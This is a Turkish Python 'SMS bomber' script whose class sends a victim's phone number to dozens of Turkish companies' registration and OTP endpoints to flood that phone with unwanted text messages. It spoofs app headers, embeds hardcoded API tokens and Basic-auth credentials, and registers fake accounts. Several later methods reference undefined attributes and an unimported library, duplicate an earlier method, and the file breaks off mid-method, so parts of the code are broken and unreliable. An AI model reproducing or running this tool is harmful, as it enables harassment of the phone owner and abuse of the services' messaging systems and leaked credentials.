import requests
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style


class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"


    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                "mobile_number": self.phone,
                "token_type": "register_token"
            })
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")


    #englishhome.com
    def Englishhome(self):
        try:
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
    

    #mopas.com.tr
    def Mopas(self):
        try:
            cookies = {"JSESSIONID": "6817377124C666AA59F3E6B0678F124C"}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Dnt": "1", "Referer": "https://mopas.com.tr/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=", cookies=cookies, headers=headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
            

    #icq.net
    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            r = requests.post(url, headers=headers)
            if r.json()["response"]["statusCode"] == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
          

    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC", "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4", "Accept-Language": "en"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")

                 
    #marti.tech
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")


    #heyscooter.com.tr
    def Hey(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(url, headers=headers)
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")

        
    #bisu.com.tr
    def Bisu(self):
        try:
            url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Device-Platform": "IOS", "X-Build-Version-Name": "9.4.0", "Authorization": "0561b4dd-e668-48ac-b65e-5afa99bf098e", "X-Build-Version-Code": "22", "Accept": "*/*", "X-Device-Manufacturer": "Apple", "X-Device-Locale": "en", "X-Client-Device-Id": "66585653-CB6A-48CA-A42D-3F266677E3B5", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Model": "iPhone 7 Plus", "X-Build-Type": "Release"}
            data = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["errors"] == None:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bisu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bisu.com.tr")


    #tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")


    #pisir.com
    def Pisir(self):
        try:
            url = "https://api.pisir.com:443/v1/login/"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Pisir/386 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"app_build": "386", "app_platform": "ios", "msisdn": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")


    #hizliecza.com.tr
    def Hizliecza(self):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "Bearer null"}
            json={"otpOperationType": 2, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizlieczaprodapi.hizliecza.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")


    #ipragaz.com.tr
    def Ipragaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            headers = {"Content-Type": "application/json", "X-Api-Token": "", "Authorization": "", "App-Version": "1.3.9", "App-Lang": "en", "Accept": "*/*", "App-Name": "ipragaz-mobile", "Os": "ios", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate", "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4", "App-Build": "41", "Os-Version": "15.7.7", "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8", "Connection": "close"}
            json={"birthDate": "2/7/2000", "carPlate": "31 ABC 31", "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", "name": "Memati Bas", "otp": "", "phoneNumber": self.phone, "playerId": ""}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
            
        
    #ak-asya.com.tr
    def Akasya(self):
        try:
            url = "https://akasya-admin.poilabs.com/v1/tr/sms"
            json={"phone": self.phone}
            headers = {"x-platform-token": "313131"}
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasya-admin.poilabs.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasya-admin.poilabs.com")
        
        
    #akbati.com
    def Akbati(self):
        try:
            url = "https://akbati-admin.poilabs.com/v1/tr/sms"
            json={"phone": self.phone}
            headers = {"x-platform-token": "313131"}
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbati-admin.poilabs.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbati-admin.poilabs.com")
    
    
    #clickmelive.com
    def Clickme(self):
        try:
            url = "https://dev-azure-mobile-api.clickmelive.com:443/api/v1/authorization/code"
            headers = {"Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", "Client-Version": "1.0.44", "Client-Device": "IOS", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "User-Agent": "ClickMeLive/85 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json={"phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dev-azure-mobile-api.clickmelive.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dev-azure-mobile-api.clickmelive.com")
    
    
    #happy.com.tr
    def Happy(self):
        try:
            url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "Origin": "https://www.happy.com.tr", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Referer": "https://www.happy.com.tr/index.php?route=account/register"}
            data = {"telephone": self.phone}
            r = requests.post(url=url, data=data, headers=headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> happy.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> happy.com.tr")
    

    #komagene.com.tr
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            json={"Telefon": self.phone,"FirmaId": "32"}
            headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")
    
    
    #kuryemgelsin.com
    def KuryemGelsin(self):
        try:
            url = "https://api.kuryemgelsin.com:443/en/api/users/registerMessage/"
            json={"phoneNumber": self.phone, "phone_country_code": "+90"}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kuryemgelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kuryemgelsin.com")
    
    
    #porty.tech
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
            
    
    #taksim.digital
    def Taksim(self):
        try:
            url = "https://service.taksim.digital/services/PassengerRegister/Register"
            json= {"countryPhoneCode": "+90","phoneNo": self.phone}
            r = requests.post(url=url, json=json)
            if r.json()["success"]== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> service.taksim.digital")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")
    
    
    #vakiftasdelensu.com
    def Tasdelen(self):
        try:
            url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
            json= {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
            r = requests.post(url=url, json=json)
            if r.json()["Result"]== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 94.102.66.162:80")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 94.102.66.162:80")
    
    
    #tasimacim.com
    def Tasimacim(self):
        try:
            url = "https://server.tasimacim.com/requestcode"
            json= {"phone": self.phone, "lang": "tr"}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")
    
    
    #toptanteslim.com
    def ToptanTeslim(self):
        try:
            url = "https://tt.etic.com.tr:443/api/setCustomer"
            headers = {"authorization": "Basic dG9wdGFudGVzbGltOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm"}
            data = {"telephone": f"0{self.phone}","name": "Memati","surname": "Bas","email": self.mail,"password": "313131","password_confirmation": "313131"}
            r = requests.post(url=url, data=data, headers=headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tt.etic.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tt.etic.com.tr")
    

    #unilever.com.tr
    def Unilever(self):
        try:
            url = "https://www.siparisdirekt.com/customer/otp/sendotp"
            data = {"mobile": self.phone, "prefix": "+90"}
            headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}
            r = requests.post(url=url, headers=headers, data=data)
            if r.json()["status"] == 1:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> siparisdirekt.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> siparisdirekt.com")


    #uysalmarket.com.tr
    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms"
            json = {"phone_number": self.phone}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")
    
    
    #yapp.com.tr
    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            json={"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "", "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "1", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")
    
    
    #yilmazticaret.net
    def YilmazTicaret(self):
        try:
            url = "http://www.yilmazticaret.net:80/restapi2/register/"
            headers = {"Authorization": "Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="}
            data = {"telefon": (None, f"0 {self.phone}"),"token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}
            r = requests.post(url, headers=headers,  data=data)
            if r.json()["giris"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yilmazticaret.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yilmazticaret.net")
    
    
    #yuffi.co
    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
            

    #beefull.com
    def  Beefull(self):
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            requests.post(url, json=json)
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")


    # dsmartgo.com.tr
    def Dsmartgo(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	        "IsSubscriber": "true",
        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	        "Mobile": numara,
                }, cookies={
        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		    "_ga": "GA1.3.1016548678.1638216163",
        		    "_gat": "1",
        		    "_gat_gtag_UA_18913632_14": "1",
        		    "_gid": "GA1.3.1214889554.1638216163",
        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	    })
            try:
                BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")
            except AttributeError:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                self.adet += 1
                self.toplam_sms += 1
            uygulanan_nolar += 1
            if uygulanan_nolar == bos_olmayan:
                break
            else:
                continue
        

    # kigili.com
    def Kigili(self): 
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    kigili = requests.post("https://www.kigili.com/users/registration/", data={
                    "first_name": "Memati",
                    "last_name": "Bas",
                    "email": self.mail,
                    "phone": f"0{numara}",
                    "password": "31ABC..abc31",
                    "confirm": "true",
                    "kvkk": "true",
                    "next": ""
                })
                    if kigili.status_code == 202:
                         print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                    else:
                        raise 
                except :
                     print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
        

    #kahvedunyasi.com
    def KahveDunyasi(self):    
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                    "mobile_number": numara,
                    "token_type": "register_token"
                })
                    if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> core.kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise 
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
        

    #naosstars.com
    def NaosStars(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                    "email": self.mail,
                    "first_name": "Memati",
                    "last_name": "Bas",
                    "password": "31ABC..abc31",
                    "date_of_birth": "1975-12-31",
                    "phone": f"0{numara}",
                    "gender": "male",
                    "kvkk": "true",
                    "contact": "true",
                    "confirm": "true"
                })
                    if naosstars.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> shop.naosstars.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                       raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> shop.naosstars.com "+numara)
                uygulanan_nolar += 1
